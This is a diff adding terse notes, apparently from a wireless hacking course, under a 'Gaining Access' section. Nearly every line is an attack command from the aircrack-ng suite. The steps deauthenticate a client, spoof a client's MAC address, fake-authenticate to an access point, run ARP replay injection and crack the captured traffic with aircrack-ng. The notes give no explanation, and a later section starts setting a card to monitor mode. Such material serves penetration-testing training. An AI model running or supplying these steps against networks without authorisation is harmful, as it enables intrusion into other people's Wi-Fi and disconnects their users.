@@ -10,4 +10,59 @@
 
 6) kill %1
 
-7) 
+Section - 3 (Gaining Access) 
+
+1) airodump-ng --bssid 64:16:F0:EC:7B:F3 --channel 6 mon0 
+
+2) aireplay-ng --deauth 4 -a 64:16:F0:EC:7B:F3 -c 80:E6:50:22:A2:E8 mon0 
+
+v-12
+
+3) airmon-ng stop wlan0mon
+
+or 
+
+3) iwconfig mon0 mode managed 
+
+4) service network-manager start 
+
+
+v-13)
+
+5) airodump-ng mon0
+
+6) airodump-ng --bssid 64:16:F0:EC:7B:F3 --channel 6 mon0 
+
+7) ifconfig wlano down 
+
+8) macchanger -m 80:E6:50:22:A2:E8 wlan0 
+
+v-14)
+
+9) airodump-ng mon0 
+
+10) airodump-ng --bssid 00:10:18:90:2D:EE --channel l --write ska-test mon0
+
+11) aireplay-ng --fakeauth 0 -a 00:10:18:90:2D:EE -h 00:C0:CA:82:82:98 mon0 
+
+12) ifconfig mon0 
+
+13) airodump-ng --bssid 00:10:18:90:2D:EE --channel 1 --write ska-test2 mon0 
+
+14) aireplay-ng --arpreplay -b 00:10:18:90:2D:EE -h 80:E6:50:22:A2:E8 mon0 
+
+15) aircrack-ng ska-test2-01.cap
+
+Section -4 
+
+1) ifconfig 
+
+2) ifconfig wlan0 down 
+
+3) iwconfig wlan0 mode monitor 
+
+4) ifconfig wlan0 up
+
+5) airodump-ng wlan0 
+
+6) 
